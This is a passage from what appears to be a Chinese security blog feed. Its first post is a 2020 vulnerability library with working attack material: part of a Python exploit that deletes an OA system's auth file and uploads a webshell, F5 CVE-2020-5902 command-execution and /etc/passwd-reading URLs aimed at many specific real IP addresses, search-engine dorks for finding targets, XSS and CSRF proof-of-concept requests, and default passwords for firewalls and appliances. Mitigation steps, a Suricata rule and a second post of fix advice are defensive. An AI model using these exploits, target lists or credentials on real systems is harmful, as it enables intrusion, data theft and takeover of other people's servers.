class="line">url&#x3D;target+&quot;&#x2F;module&#x2F;appbuilder&#x2F;assets&#x2F;print.php?guid&#x3D;..&#x2F;..&#x2F;..&#x2F;webroot&#x2F;inc&#x2F;auth.inc.php&quot; </span><br><span class="line">requests.get(url&#x3D;url)</span><br><span class="line"></span><br><span class="line">print(&quot;[*]Checking if file deleted...&quot;) </span><br><span class="line">url&#x3D;target+&quot;&#x2F;inc&#x2F;auth.inc.php&quot; </span><br><span class="line">page&#x3D;requests.get(url&#x3D;url).text</span><br><span class="line"></span><br><span class="line">if &#39;No input file specified.&#39; not in page: </span><br><span class="line">print(&quot;[-]Failed to deleted auth.inc.php&quot;) </span><br><span class="line">exit(-1)</span><br><span class="line"></span><br><span class="line">print(&quot;[+]Successfully deleted auth.inc.php!&quot;) print(&quot;[*]Uploading payload...&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url&#x3D;target+&quot;&#x2F;general&#x2F;data_center&#x2F;utils&#x2F;upload.php?action&#x3D;upload&amp;filetype&#x3D;nmsl&amp;repkid&#x3D;&#x2F;.&lt;&gt;.&#x2F;.&lt;&gt;.&#x2F;.&lt;&gt;.&#x2F;&quot; </span><br><span class="line">files &#x3D; &#123;&#39;FILE1&#39;: (&#39;deconf.php&#39;, payload)&#125;</span><br><span class="line"></span><br><span class="line">requests.post(url&#x3D;url,files&#x3D;files) </span><br><span class="line">url&#x3D;target+&quot;&#x2F;_deconf.php&quot; </span><br><span class="line">page&#x3D;requests.get(url&#x3D;url).text</span><br><span class="line"></span><br><span class="line">if &#39;No input file specified.&#39; not in page: </span><br><span class="line">print(&quot;[+]Filed Uploaded Successfully&quot;) </span><br><span class="line">print(&quot;[+]URL:&quot;,url)</span><br><span class="line"></span><br><span class="line">else:</span><br><span class="line"></span><br><span class="line">print(&quot;[-]Failed to upload file&quot;) </span><br></pre></td></tr></table></figure><p>4.然后执行该exp的效果如下图<br><img src="/image/HW/77.jpg" alt="1"><br>5.用菜刀连接该后门，如下<br><img src="/image/HW/78.jpg" alt="1"><br><a href="https://github.com/TomAPU/poc_and_exp">https://github.com/TomAPU/poc_and_exp</a> <a href="https://drivertom.blogspot.com/2019/06/pyspider-webuipocexp.html">https://drivertom.blogspot.com/2019/06/pyspider-webuipocexp.html</a><br><a href="https://www.cnblogs.com/yuzly/p/13600532.html">https://www.cnblogs.com/yuzly/p/13600532.html</a> <a href="https://www.cnblogs.com/panisme/p/12560769.html">https://www.cnblogs.com/panisme/p/12560769.html</a></p><h2 id="F5负载均衡：cve-2020-5902"><a href="#F5负载均衡：cve-2020-5902" class="headerlink" title="F5负载均衡：cve-2020-5902"></a>F5负载均衡：cve-2020-5902</h2><p>版本影响：</p><p>BIG-IP 15.x: 15.1.0/15.0.0<br>BIG-IP 14.x: 14.1.0 ~ 14.1.2<br>BIG-IP 13.x: 13.1.0 ~ 13.1.3<br>BIG-IP 12.x: 12.1.0 ~ 12.1.5<br>BIG-IP 11.x: 11.6.1 ~ 11.6.5</p><p>远程命令执行RCE:</p><p><code>curl -v -k &#39;https://[F5 Host]/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin&#39;</code></p><p> <a href="https://43.247.102.140/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin">https://43.247.102.140/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin</a> </p><p><a href="https://43.247.102.142/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin">https://43.247.102.142/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin</a><br><img src="/image/HW/79.jpg" alt="1"></p><p><img src="/image/HW/80.jpg" alt="1"></p><p><img src="/image/HW/81.jpg" alt="1"><br>文 件 包 含 漏 洞 ：<br><code>https://&lt;IP&gt;/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd</code><br><code>https://&lt;IP&gt;/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/hosts</code><br><code>https://&lt;IP&gt;/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp? fileName=/config/bigip.license</code> <code>https://&lt;IP&gt;/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/config/bigip.conf</code> <code>https://183.2.157.179/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd</code> <code>https://36.110.142.2/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd</code> <code>https://183.2.157.181/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd</code> <code>https://58.215.213.226/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd</code> <code>https://36.110.49.152/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd</code> <code>https://116.204.216.4/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd</code> <code>https://116.204.219.3/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd</code> <code>https://43.247.102.141/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd</code></p><p><code>https://218.205.188.31/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd</code> <code>https://60.247.99.150/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd</code> <code>https://36.110.49.151//tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd</code> <code>https://111.198.181.151/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd</code> <code>https://220.248.87.92/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd</code> <code>https://43.247.102.142/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd</code> <code>https://183.2.157.180/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd</code> <code>https://43.247.102.140/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd</code><br><img src="/image/HW/82.jpg" alt="1"><br><img src="/image/HW/83.jpg" alt="1"><br><img src="/image/HW/84.jpg" alt="1"><br>临时修补建议：<br>官方建议可以通过以下步骤临时缓解影响<br>1.使用以下命令登录对应系统tmsh<br>2.编辑 httpd 组件的配置文件<br>edit /sys httpd all-properties</p><p>3.文件内容如下<br>include ‘ &lt;LocationMatch “.*..;.*”&gt; Redirect 404 / </LocationMatch> ‘<br>4.按照如下操作保存文件按下 ESC 并依次输入 :wq<br>5.执行命令刷新配置文件save /sys config<br>6.重启 httpd 服务<br>restart sys service httpd<br>7.并禁止外部IP对 TMUI 页面的访问</p><p>搜索目标：<br>注：请将下面的%26替换为&amp;。<br>shodan<br>http.favicon.hash:-335242539<br>http.favicon.hash:-335242539 “3992”<br>http.title:”BIG-IP%26reg;- Redirect”<br>http.title:”BIG-IP&reg;- Redirect”</p><p>fofa<br>title=”BIG-IP%26reg;- Redirect”</p><p>censys 443.https.get.body_sha256:5d78eb6fa93b995f9a39f90b6fb32f016e80dbcda8eb71a17994678692585ee5<br>443.https.get.title:”BIG-IP%26reg;- Redirect”</p><p>google inurl:”tmui/login.jsp”<br>intitle:”BIG-IP” inurl:”tmui”<br>登 录 页 面 ：<br>https://<target>/tmui/login.jsp<br>漏洞检测<br>/tmui/login.jsp/..;/tmui/system/user/authproperties.jsp<br>/tmui/login.jsp/..;/tmui/util/getTabSet.jsp?tabId=a</p><p><a href="https://github.com/yassineaboukir/CVE-2020-5902">https://github.com/yassineaboukir/CVE-2020-5902</a><br><a href="https://github.com/jas502n/CVE-2020-5902">https://github.com/jas502n/CVE-2020-5902</a> <a href="https://github.com/aqhmal/CVE-2020-5902-Scanner">https://github.com/aqhmal/CVE-2020-5902-Scanner</a> <a href="https://github.com/nsflabs/CVE-2020-5902">https://github.com/nsflabs/CVE-2020-5902</a> <a href="https://github.com/yasserjanah/CVE-2020-5902">https://github.com/yasserjanah/CVE-2020-5902</a> <a href="https://github.com/JSec1337/RCE-CVE-2020-5902">https://github.com/JSec1337/RCE-CVE-2020-5902</a> <a href="https://github.com/payloadbox/command-injection-payload-list">https://github.com/payloadbox/command-injection-payload-list</a></p><p>suricata CVE-2020-5902 检测规则：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">alert http $EXTERNAL_NET any -&gt; any any (msg:&quot;ET EXPLOIT F5 TMUI RCE vulnerability CVE-2020-5902 Attempt&quot;; </span><br><span class="line">flow:established,to_server; </span><br><span class="line">http.uri; content:&quot;&#x2F;tmui&#x2F;login.jsp&#x2F;..|3b|&#x2F;&quot;; depth:20; metadata: former_category EXPLOIT; reference:cve,2020- 5902; reference:url,support.f5.com&#x2F;csp&#x2F;article&#x2F;K52145254; </span><br><span class="line">classtype:attempted-admin; sid:2030469; </span><br><span class="line">rev:3; metadata:affected_product Web_Server_Applications, attack_target Web_Server, deployment Perimeter, signature_severity Critical, created_at 2020_07_05, updated_at 2020_07_05;)</span><br></pre></td></tr></table></figure><h2 id="fastadmin前台getshell-csrf-xss"><a href="#fastadmin前台getshell-csrf-xss" class="headerlink" title="fastadmin前台getshell+csrf+xss"></a>fastadmin前台getshell+csrf+xss</h2><p>1.影响版本</p><p>V1.0.0.20200506_beta</p><p>2.利用限制</p><p>/application/config.php文件中:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;是否开启前台会员中心</span><br><span class="line"></span><br><span class="line">&#39;usercenter&#39;</span><br></pre></td></tr></table></figure><p>即需要开启会员中心功能为利用前提条件：</p><p>3.漏洞位置</p><p><code>/application/index/User.php</code>文件</p><p>第58-67行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public function _empty($name)</span><br><span class="line">&#123;</span><br><span class="line">$data &#x3D; Hook::listen(&quot;user_request_empty&quot;, $name); </span><br><span class="line">foreach ($data as $index &#x3D;&gt; $datum) &#123;</span><br><span class="line">$this-&gt;view-&gt;assign($datum);</span><br><span class="line">&#125;</span><br><span class="line">return $this-&gt;view-&gt;fetch(&#39;user&#x2F;&#39; . $name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>此方法中的$name参数可控，可导致fetch模板注入</p><p>攻击者可以利用该突破性扩展包含指定的路径的后门文件，就可以getshell</p><p>3.漏洞验证</p><p>登陆会员中心，在个人资料页面中修改个人头像:<br><img src="/image/HW/85.png" alt="1"><br>抓包后修改图片数据（满足图片头格式即可）：<br><img src="/image/HW/86.jpg" alt="1"><br>记录下路径后，成功getshell<br><img src="/image/HW/87.jpg" alt="1"><br>修复建议<br>对传入进来的<code>$name</code>变量做一下过滤</p><p>还存在以下漏洞：</p><p>后台分类管理处存在xss</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"> POST &#x2F;admin.php&#x2F;category&#x2F;add?dialog&#x3D;1 HTTP&#x2F;1.1</span><br><span class="line"></span><br><span class="line"> Host: admin.com</span><br><span class="line"></span><br><span class="line"> User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko&#x2F;20100101 Firefox&#x2F;77.0</span><br><span class="line"></span><br><span class="line"> Accept: application&#x2F;json, text&#x2F;javascript, *&#x2F;*; q&#x3D;0.01</span><br><span class="line"></span><br><span class="line"> Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line"></span><br><span class="line"> Accept-Encoding: gzip, deflate</span><br><span class="line"></span><br><span class="line"> Content-Type: application&#x2F;x-www-form-urlencoded; charset&#x3D;UTF-8</span><br><span class="line"></span><br><span class="line"> X-Requested-With: XMLHttpRequest</span><br><span class="line"></span><br><span class="line"> Content-Length: 233</span><br><span class="line"></span><br><span class="line"> Origin: [http:&#x2F;&#x2F;admin.com](http:&#x2F;&#x2F;admin.com&#x2F;)</span><br><span class="line"></span><br><span class="line"> Connection: close</span><br><span class="line"></span><br><span class="line"> Referer: http:&#x2F;&#x2F;admin.com&#x2F;admin.php&#x2F;category&#x2F;add?dialog&#x3D;1</span><br><span class="line"></span><br><span class="line"> Cookie: PHPSESSID&#x3D;ou6fjfn717lu02rfm9saqguca4; uid&#x3D;3; token&#x3D;f824ac8c-ac7b-4979-a89b-b47dd8e79226</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">row%5Btype%5D&#x3D;default&amp;row%5Bpid%5D&#x3D;0&amp;row%5Bname%5D&#x3D;%3Cscript%3Ealert(1)%3C%2Fscript%3E&amp;row%5Bnickname%5D&#x3D;123&amp;row%5Bimage%5D&#x3D;1&amp;row%5Bkeywords%5D&#x3D;123&amp;row%5Bde</span><br></pre></td></tr></table></figure><p><img src="/image/HW/88.jpg" alt="1"><br>且存在csrf漏洞</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script&gt;history.pushState(&#39;&#39;, &#39;&#39;, &#39;&#x2F;&#39;)&lt;&#x2F;script&gt;</span><br><span class="line">&lt;form action&#x3D;&quot;http:&#x2F;&#x2F;admin.com&#x2F;admin.php&#x2F;category&#x2F;add?dialog&#x3D;1&quot; method&#x3D;&quot;POST&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;row&amp;#91;type&amp;#93;&quot; value&#x3D;&quot;default&quot; &#x2F;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;row&amp;#91;pid&amp;#93;&quot; value&#x3D;&quot;0&quot; &#x2F;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;row&amp;#91;name&amp;#93;&quot; value&#x3D;&quot;&lt;script&gt;alert&amp;#40;1&amp;#41;&lt;&amp;#47;script&gt;&quot; &#x2F;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;row&amp;#91;nickname&amp;#93;&quot; value&#x3D;&quot;123&quot; &#x2F;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;row&amp;#91;image&amp;#93;&quot; value&#x3D;&quot;1&quot; &#x2F;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;row&amp;#91;keywords&amp;#93;&quot; value&#x3D;&quot;123&quot; &#x2F;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;row&amp;#91;description&amp;#93;&quot; value&#x3D;&quot;123&quot; &#x2F;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;row&amp;#91;weigh&amp;#93;&quot; value&#x3D;&quot;0&quot; &#x2F;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;row&amp;#91;status&amp;#93;&quot; value&#x3D;&quot;normal&quot; &#x2F;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;row&amp;#91;flag&amp;#93;&amp;#91;&amp;#93;&quot; value&#x3D;&quot;&quot; &#x2F;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;Submit request&quot; &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="一些弱口令字典"><a href="#一些弱口令字典" class="headerlink" title="一些弱口令字典:"></a>一些弱口令字典:</h2><p>使用范围不限于系统服务、应用服务、应用程序,可以用这些生成字典对内网资产巡检。</p><p>泛微OA默认system账号: system/system<br>Apache DolphinScheduler: admin/dolphinscheduler<br>1、账号<a href="mailto:&#x61;&#100;&#109;&#105;&#x6e;&#x40;&#x61;&#100;&#109;&#105;&#x6e;&#46;&#x63;&#111;&#109;">&#x61;&#100;&#109;&#105;&#x6e;&#x40;&#x61;&#100;&#109;&#105;&#x6e;&#46;&#x63;&#111;&#109;</a> superadmin admin123<br>xadmin system admin root<br>2、密码<br>$companyName$@2020</p><p>$companyName$2020</p><p>$companyName$123 admin123<br>12345678</p><p>123456</p><p>admin root<br>为啥没写administrators, 因为上面都是我随便想出来的,这个我记不住。<br>安全设备弱密码排查列表:<br>天融信防火墙 用户名:superman 密码:talent<br>天融信防火墙 用户名:superman 密码:talent!23<br>联想网御防火墙 用户名:admin 密码:leadsec@7766、administrator、bane@7766 深信服防火墙 用户名：admin 密码：admin<br>启明星辰 用户名：admin 密码：bane@7766 用户名：admin 密码：admin@123 juniper 用户名:netscreen 密码:netscreen<br>Cisco 用 户 名 :admin 密 码 :cisco Huawei 用户名:admin 密码:Admin@123 H3C 用户名:admin 密码:admin<br>绿盟IPS 用户名: weboper 密码: weboper<br>网神防火墙GE1 用户名：admin 密码：firewall 深信服VPN：51111端口 密码:delanrecover 华为VPN：账号：root 密码：mduadmin<br>华为防火墙：admin 密码:Admin@123<br>EudemonJuniper防火墙：netscreen netscreen<br>迪普 192.168.0.1 默认的用户名和密码（admin/admin_default)<br>山石 192.168.1.1 默认的管理账号为hillstone，密码为hillstone 安恒的明御防火墙 admin/adminadmin<br>某堡垒机 shterm/shterm</p><p>天融信的vpn test/123456<br>绿盟安全产品默认密码排查列表:<br>IPS入侵防御系统、SASH运维安全管理系统、SAS安全审计系统、DAS数据库审计系统、RSAS远程安全评估系统、WAF WEB应用防护系统<br>sysauditor/sysauditor<br>sysmanager/sysmanager<br>supervisor/supervisor<br>maintainer/maintainer<br>webpolicy/webpolicy<br>sysadmin/sysadmin<br>conadmin/conadmin<br>supervis/supervis<br>webaudit/webaudit<br>sysadmin/sysadmin<br>conadmin/nsfocus<br>weboper/weboper<br>auditor/auditor<br>weboper/weboper<br>nsadmin/nsadmin<br>admin/nsfocus<br>admin/admin<br>shell/shell</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HW </tag>
            
            <tag> 2020 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常见漏洞描述及修复建议</title>
      <link href="post/webldxf.html"/>
      <url>post/webldxf.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>　　Web程序中对于用户提交的参数未做过滤直接拼接到SQL语句中执行，导致参数中的特殊字符破坏了SQL语句原有逻辑，攻击者可以利用该漏洞执行任意SQL语句，如查询数据、下载数据、写入webshell、执行系统命令以及绕过登录限制等。</p><h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><p>代码层最佳防御sql漏洞方案：使用预编译sql语句查询和绑定变量。</p><pre><code>  （1）使用预编译语句，使用PDO需要注意不要将变量直接拼接到PDO语句中。所有的查询语句都使用数据库提供的参数化查询接口，参数化的语句使用参数而不是将用户输入变量嵌入到SQL语句中。当前几乎所有的数据库系统都提供了参数化SQL语句执行接口，使用此接口可以非常有效的防止SQL注入攻击。  （2）对进入数据库的特殊字符（’”&lt;&gt;&amp;*;等）进行转义处理，或编码转换。  （3）确认每种数据的类型，比如数字型的数据就必须是数字，数据库中的存储字段必须对应为int型。  （4）数据长度应该严格规定，能在一定程度上防止比较长的SQL注入语句无法正确执行。  （5）网站每个数据层的编码统一，建议全部使用UTF-8编码，上下层编码不一致有可能导致一些过滤模型被绕过。  （6）严格限制网站用户的数据库的操作权限，给此用户提供仅仅能够满足其工作的权限，从而最大限度的减少注入攻击对数据库的危害。  （7）避免网站显示SQL错误信息，比如类型错误、字段不匹配等，防止攻击者利用这些错误信息进行一些判断。  （8）过滤危险字符，例如：采用正则表达式匹配union、sleep、and、select、load_file等关键字，如果匹配到则终止运行。</code></pre><h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><h3 id="漏洞描述-1"><a href="#漏洞描述-1" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>　　1、Web程序代码中对用户提交的参数未做过滤或过滤不严，导致参数中的特殊字符破坏了HTML页面的原有逻辑，攻击者可以利用该漏洞执行恶意HTML/JS代码、构造蠕虫、篡改页面实施钓鱼攻击、以及诱导用户再次登录，然后获取其登录凭证等。</p><p>　　2、XSS攻击对Web服务器本身虽无直接危害，但是它借助网站进行传播，对网站用户进行攻击，窃取网站用户账号身份信息等，从而也会对网站产生较严重的威胁。</p><p>XSS攻击可导致以下危害：</p><p>　　1、钓鱼欺骗：最典型的就是利用目标网站的反射型跨站脚本漏洞将目标网站重定向到钓鱼网站，或者通过注入钓鱼JavaScript脚本以监控目标网站的表单输入，甚至攻击者基于DHTML技术发起更高级的钓鱼攻击。</p><p>　　2、网站挂马：跨站时，攻击者利用Iframe标签嵌入隐藏的恶意网站，将被攻击者定向到恶意网站上、或弹出恶意网站窗口等方式，进行挂马。</p><p>　　3、身份盗用：Cookie是用户对于特定网站的身份验证标志，XSS攻击可以盗取用户的cookie，从而利用该cookie盗取用户对该网站的操作权限。</p><p>　　4、盗取网站用户信息：当窃取到用户cookie从而获取到用户身份时，攻击者可以盗取到用户对网站的操作权限，从而查看用户隐私信息。</p><p>　　5、垃圾信息发送：在社交网站社区中，利用XSS漏洞借用被攻击者的身份发送大量的垃圾信息给特定的目标群。</p><p>　　6、劫持用户Web行为：一些高级的XSS攻击甚至可以劫持用户的Web行为，从而监视用户的浏览历史、发送与接收的数据等等。</p><p>　　7、XSS蠕虫：借助XSS蠕虫病毒还可以用来打广告、刷流量、挂马、恶作剧、破坏数据、实施DDoS攻击等。</p><h3 id="修复建议-1"><a href="#修复建议-1" class="headerlink" title="修复建议"></a>修复建议</h3><p>xss漏洞本质上是一种html注入，也就是将html代码注入到网页中。那么其防御的根本就是在将用户提交的代码显示到页面上时做好一系列的过滤与转义</p><pre><code>  （1）过滤输入的数据，对例如：“ ‘ ”，“ “ ”，” &lt; “，” &gt; “，” on* “，script、iframe等危险字符进行严格的检查。这里的输入不仅仅是用户可以直接交互的输入接口，也包括HTTP请求中的Cookie中的变量，HTTP请求头部中的变量等。  （2）不仅验证数据的类型，还要验证其格式、长度、范围和内容。  （3）不仅在客户端做数据的验证与过滤，关键的过滤步骤在服务端进行。  （4）对输出到页面的数据进行相应的编码转换，如HTML实体编码、JS编码等。对输出的数据也要检查，数据库里的值有可能会在一个大网站的多处都有输出，即使在输入做了编码等操作，在各处的输出点时也要进行检查。</code></pre><h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><h3 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h3><pre><code>  参考：https://www.freebuf.com/company-information/165769.html</code></pre><h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><h3 id="漏洞描述："><a href="#漏洞描述：" class="headerlink" title="漏洞描述："></a>漏洞描述：</h3><p>　　CSRF是跨站请求伪造，不攻击网站服务器，而是冒充用户在站内的正常操作。通常由于服务端没有对请求头做严格过滤引起的。CSRF会造成密码重置，用户伪造等问题，可能引发严重后果。绝大多数网站是通过 cookie 等方式辨识用户身份，再予以授权的。所以要伪造用户的正常操作，最好的方法是通过 XSS 或链接欺骗等途径，让用户在本机（即拥有身份 cookie 的浏览器端）发起用户所不知道的请求。CSRF攻击会令用户在不知情的情况下攻击自己已经登录的系统。</p><h3 id="修复建议-2"><a href="#修复建议-2" class="headerlink" title="修复建议"></a>修复建议</h3><pre><code>  1、验证请求的Referer是否来自本网站，但可被绕过。  2、在请求中加入不可伪造的token，并在服务端验证token是否一致或正确，不正确则丢弃拒绝服务。</code></pre><h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><h3 id="漏洞描述-2"><a href="#漏洞描述-2" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>　　SSRF（Server-Side Request Forgery，服务器端请求伪造）：通俗的来说就是我们可以伪造服务器端发起的请求，从而获取客户端所不能得到的数据。SSRF漏洞形成的原因主要是服务器端所提供的接口中包含了所要请求的内容的URL参数，并且未对客户端所传输过来的URL参数进行过滤。这个漏洞造成的危害有：</p><p>　　(1)、可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息;</p><p>　　(2)、攻击运行在内网或本地的应用程序（比如溢出）;</p><p>　　(3)、对内网Web应用进行指纹识别，通过访问默认文件实现;</p><p>　　(4)、攻击内外网的Web应用，主要是使用Get参数就可以实现的攻击（比如Struts2漏洞利用，SQL注入等）;</p><p>　　(5)、利用File协议读取本地文件。</p><h3 id="修复建议-3"><a href="#修复建议-3" class="headerlink" title="修复建议"></a>修复建议</h3><pre><code>  1、禁用不需要的协议，只允许HTTP和HTTPS请求，可以防止类似于file://, gopher://, ftp:// 等引起的问题。  2、白名单的方式限制访问的目标地址，禁止对内网发起请求  3、过滤或屏蔽请求返回的详细信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。  4、验证请求的文件格式  5、禁止跳转  6、限制请求的端口为http常用的端口，比如 80、443、8080、8000等  7、统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</code></pre><h1 id="任意命令-代码执行"><a href="#任意命令-代码执行" class="headerlink" title="任意命令/代码执行"></a>任意命令/代码执行</h1><h3 id="漏洞描述-3"><a href="#漏洞描述-3" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>　　命令或代码执行漏洞是指代码未对用户可控参数做过滤，导致直接带入执行命令和代码，通过漏洞执行恶意构造的语句，执行任意命令或代码。攻击者可在服务器上执行任意命令，读写文件操作等，危害巨大。</p><h3 id="修复建议-4"><a href="#修复建议-4" class="headerlink" title="修复建议"></a>修复建议</h3><pre><code>  1、严格过滤用户输入的数据，禁止执行非预期系统命令。  2、减少或不使用代码或命令执行函数  3、客户端提交的变量在放入函数前进行检测  4、减少或不使用危险函数</code></pre><h1 id="任意文件上传"><a href="#任意文件上传" class="headerlink" title="任意文件上传"></a>任意文件上传</h1><h3 id="漏洞描述-4"><a href="#漏洞描述-4" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>　　文件上传漏洞通常由于代码中对文件上传功能所上传的文件过滤不严或web服务器相关解析漏洞未修复而造成的，如果文件上传功能代码没有严格限制和验证用户上传的文件后缀、类型等，攻击者可通过文件上传点上传任意文件，包括网站后门文件（webshell）控制整个网站。</p><h3 id="修复建议-5"><a href="#修复建议-5" class="headerlink" title="修复建议"></a>修复建议</h3><pre><code>  1、对上传文件类型进行验证，除在前端验证外在后端依然要做验证，后端可以进行扩展名检测，重命名文件，MIME类型检测以及限制上传文件的大小等限制来防御，或是将上传的文件其他文件存储服务器中。  2、严格限制和校验上传的文件，禁止上传恶意代码的文件。同时限制相关上传文件目录的执行权限，防止木马执行。  3、对上传文件格式进行严格校验，防止上传恶意脚本文件；  4、严格限制上传的文件路径。  5、文件扩展名服务端白名单校验。  6、文件内容服务端校验。  7、上传文件重命名。  8、隐藏上传文件路径。</code></pre><h1 id="目录穿越-目录遍历"><a href="#目录穿越-目录遍历" class="headerlink" title="目录穿越/目录遍历"></a>目录穿越/目录遍历</h1><h3 id="漏洞描述-5"><a href="#漏洞描述-5" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>　　